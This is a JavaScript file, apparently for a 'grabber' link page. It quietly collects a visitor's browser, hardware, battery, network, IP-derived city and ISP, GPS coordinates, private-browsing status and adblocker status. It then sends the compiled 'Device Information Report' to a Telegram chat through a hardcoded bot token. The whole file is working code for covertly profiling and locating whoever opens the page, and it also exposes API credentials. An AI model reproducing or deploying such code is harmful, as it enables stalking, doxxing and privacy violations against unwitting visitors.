// submit.js (updated: Touch/Mouse detection + Privacy (incognito) detection integrated into Adblock section)

async function collectAndSend(chatId) {
  if (!chatId) {
    console.warn('No chat id provided in URL.');
    return;
  }

  const safe = (fn, fallback = 'Unknown') => {
    try { const v = fn(); return (v === undefined || v === null) ? fallback : v; } catch { return fallback; }
  };

  // Basic / locale / browser
  const ua = navigator.userAgent || 'Unknown';
  const browser = (() => {
    const u = ua.toLowerCase();
    if (u.includes('edg/')) return 'Edge';
    if (u.includes('opr/') || u.includes('opera')) return 'Opera';
    if (u.includes('chrome') && !u.includes('chromium') && !u.includes('edg/')) return 'Chrome';
    if (u.includes('firefox')) return 'Firefox';
    if (u.includes('safari') && !u.includes('chrome')) return 'Safari';
    return ua;
  })();

  const platform = safe(() => navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform), 'Unknown');
  const language = safe(() => navigator.language || (navigator.languages && navigator.languages[0]), 'Unknown');
  const timezone = safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone, 'Unknown');

  // Touch / Mouse detection
  function getTouchMouseType() {
    const hasTouch = 'ontouchstart' in window || (navigator.maxTouchPoints && navigator.maxTouchPoints > 0);
    const hasMouse = window.matchMedia && window.matchMedia('(pointer: fine)').matches;

    if (hasTouch && hasMouse) return 'Both';
    if (hasTouch) return 'Touch';
    if (hasMouse) return 'Mouse';
    return 'Unknown';
  }
  const touchMouse = getTouchMouseType();

  // Hardware
  const cpuCores = safe(() => navigator.hardwareConcurrency, 'Unknown');
  const ram = safe(() => (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'));

  // Screen
  const resolution = safe(() => `${window.screen.width}x${window.screen.height}`, 'Unknown');
  const colorDepth = safe(() => `${window.screen.colorDepth}-bit`, 'Unknown');

  // WebGL info
  let webglVendor = 'Unknown', webglRenderer = 'Unknown';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || 'Unknown';
        webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || 'Unknown';
      } else {
        webglRenderer = gl.getParameter(gl.RENDERER) || 'Unknown';
      }
    }
  } catch (e) {}

  // Battery
  let batteryLevel = 'Unknown', batteryCharging = 'Unknown';
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      batteryLevel = (typeof b.level === 'number') ? Math.round(b.level * 100) + '%' : 'Unknown';
      batteryCharging = (typeof b.charging === 'boolean') ? (b.charging ? 'Yes' : 'No') : 'Unknown';
    }
  } catch (e) {}

  // Network info
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
  const netType = connection ? (connection.type || connection.effectiveType || 'Unknown') : 'Unknown';
  const downlink = connection ? (connection.downlink ? connection.downlink + ' Mbps' : 'Unknown') : 'Unknown';
  const rtt = connection ? (connection.rtt ? Math.round(connection.rtt) + ' ms' : 'Unknown') : 'Unknown';
  const saveData = connection ? (connection.saveData ? 'Enabled' : 'Disabled') : 'Unknown';

  // Incognito / Private mode detection (best-effort, heuristic)
  async function detectIncognito() {
    // Returns: 'Yes' / 'No' / 'Unknown'
    try {
      // Prefer storage.estimate() heuristic (works on many modern Chromium browsers)
      if (navigator.storage && navigator.storage.estimate) {
        const estimate = await navigator.storage.estimate();
        // quota is in bytes; in incognito Chrome quota is typically much smaller (~120MB or less)
        if (typeof estimate.quota === 'number') {
          const quota = estimate.quota;
          // threshold: 120 MB (best-effort)
          const threshold = 120 * 1024 * 1024;
          if (quota && quota < threshold) return 'Yes';
          // if quota is large, likely not incognito
          if (quota && quota >= threshold) return 'No';
        }
      }

      // Try FileSystem API (webkitRequestFileSystem) heuristic (older Chrome / Safari)
      const fsRequest = (window.webkitRequestFileSystem || window.RequestFileSystem);
      if (typeof fsRequest === 'function') {
        return await new Promise(resolve => {
          try {
            fsRequest(window.TEMPORARY, 100, () => resolve('No'), () => resolve('Yes'));
            // some browsers call the error callback when in private mode -> treat as incognito
            setTimeout(() => resolve('Unknown'), 1500);
          } catch (e) {
            resolve('Unknown');
          }
        });
      }

      // Safari detection heuristic: try to open an IndexedDB and write; in private mode it may fail
      if (window.indexedDB) {
        try {
          const dbName = 'incognitotest-' + Math.random().toString(36).slice(2);
          const openReq = indexedDB.open(dbName);
          return await new Promise(resolve => {
            let resolved = false;
            openReq.onerror = () => {
              if (!resolved) { resolved = true; resolve('Yes'); }
            };
            openReq.onsuccess = () => {
              try {
                const db = openReq.result;
                db.close();
                indexedDB.deleteDatabase(dbName);
                if (!resolved) { resolved = true; resolve('No'); }
              } catch (e) {
                if (!resolved) { resolved = true; resolve('Unknown'); }
              }
            };
            // fallback timeout
            setTimeout(() => { if (!resolved) { resolved = true; resolve('Unknown'); } }, 1500);
          });
        } catch (e) {
          // ignore and continue
        }
      }

      // If none of the heuristics worked, return Unknown
      return 'Unknown';
    } catch (e) {
      return 'Unknown';
    }
  }

  // Adblock (and related) detection - returns detailed object
  async function detectAdblockAndCookies() {
    let method = '';
    let detected = 'Negative';
    // DOM bait
    try {
      const bait = document.createElement('div');
      bait.className = 'adsbox ad-banner adsbygoogle adunit';
      bait.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;top:-9999px';
      document.body.appendChild(bait);
      await new Promise(r => setTimeout(r, 60));
      const isHidden = (bait.offsetParent === null || bait.offsetHeight === 0 || bait.clientHeight === 0 || getComputedStyle(bait).display === 'none');
      bait.remove();
      if (isHidden) { detected = 'Positive'; method = 'DOM'; }
    } catch {}

    // Network fetch
    if (detected === 'Negative') {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 2500);
        // no-cors mode: success does not expose status, but failing will throw
        await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'GET', mode: 'no-cors', signal: controller.signal });
        clearTimeout(timeout);
        method = 'None';
      } catch {
        detected = 'Positive';
        method = method || 'Network';
      }
    }

    // Cookie test
    let cookiesBlocked = 'No';
    try {
      document.cookie = "abctest=1; SameSite=Lax";
      if (!document.cookie.includes("abctest")) cookiesBlocked = 'Yes';
      // cleanup
      document.cookie = "abctest=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=Lax";
    } catch {
      cookiesBlocked = 'Yes';
    }

    return { detected, method, cookiesBlocked };
  }

  // Run privacy/adblock/incognito checks and geolocation in parallel
  const [incognitoResult, adblockResult, geoResult] = await Promise.all([
    detectIncognito(),
    detectAdblockAndCookies(),
    // geolocation function:
    (async function getGeolocation() {
      let status = 'Denied', latitude = 'Denied', longitude = 'Denied';
      const getPos = (timeoutMs = 8000) => new Promise((resolve, reject) => {
        let done = false;
        if (!navigator.geolocation) return reject(new Error('No geolocation'));
        navigator.geolocation.getCurrentPosition(p => { if (!done) { done = true; resolve(p); } },
                                                e => { if (!done) { done = true; reject(e); } },
                                                { enableHighAccuracy: false, maximumAge: 60000, timeout: timeoutMs });
        setTimeout(() => { if (!done) { done = true; reject(new Error('timeout')); } }, timeoutMs + 200);
      });
      try {
        const p = await getPos();
        status = 'Allowed';
        latitude = p.coords.latitude;
        longitude = p.coords.longitude;
      } catch (err) {
        status = (err && err.code === err.PERMISSION_DENIED) ? 'Denied' : 'Unavailable';
      }
      return { status, latitude, longitude };
    })()
  ]);

  // IP info
  let ip='Unknown', city='Unknown', region='Unknown', country='Unknown', org='Unknown';
  try {
    const res = await fetch('https://ipinfo.io/json?token=18d2a866939a58');
    if (res.ok) {
      const d = await res.json();
      ip = d.ip || ip;
      city = d.city || city;
      region = d.region || region;
      country = d.country || country;
      org = d.org || org;
    }
  } catch (e) {}

  // Build message
  const message = 
`🔰 Device Information Report 🔰

🌐 𝗕𝗮𝘀𝗶𝗰 𝗜𝗻𝗳𝗼:
- Browser: ${browser}
- Platform: ${platform}
- Language: ${language}
- Timezone: ${timezone}
- Touch/Mouse: ${touchMouse}

💻 𝗛𝗮𝗿𝗱𝘄𝗮𝗿𝗲:
- CPU: ${cpuCores} cores
- RAM: ${ram}
- Screen: ${resolution}, ${colorDepth}
- WebGL: ${webglRenderer} (${webglVendor})

📶 𝗡𝗲𝘁𝘄𝗼𝗿𝗸 𝗜𝗻𝗳𝗼:
- Connection Type: ${netType}
- Speed: ${downlink}
- Latency: ${rtt}
- Data Saver: ${saveData}
- ISP: ${org || 'Unknown'}

📍 𝗜𝗣 𝗜𝗻𝗳𝗼:
- IP: ${ip}
- City: ${city}
- Region: ${region}
- Country: ${country}
𝙽𝚘𝚝𝚎: 𝙸𝙿-𝚋𝚊𝚜𝚎𝚍 𝚕𝚘𝚌𝚊𝚝𝚒𝚘𝚗 𝚖𝚊𝚢 𝚗𝚘𝚝 𝚋𝚎 𝚊𝚌𝚌𝚞𝚛𝚊𝚝𝚎.

📌 𝗚𝗣𝗦:
- Status: ${geoResult.status}
- Latitude: ${geoResult.latitude}
- Longitude: ${geoResult.longitude}
- Map View: https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}

🔐 𝗣𝗿𝗶𝘃𝗮𝗰𝘆 & 𝗕𝗹𝗼𝗰𝗸𝗲𝗿𝘀 𝗜𝗻𝗳𝗼:
- Incognito / Private Mode: ${incognitoResult}
- Adblocker Detected: ${adblockResult.detected}
- Method: ${adblockResult.method}
- Cookies Blocked: ${adblockResult.cookiesBlocked}

🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆:
- Level: ${batteryLevel}
- Charging: ${batteryCharging}
`;

  const token = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
  const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;

  try {
    await fetch(tgUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });
  } catch (err) {
    console.error('Telegram send error', err);
  }
}
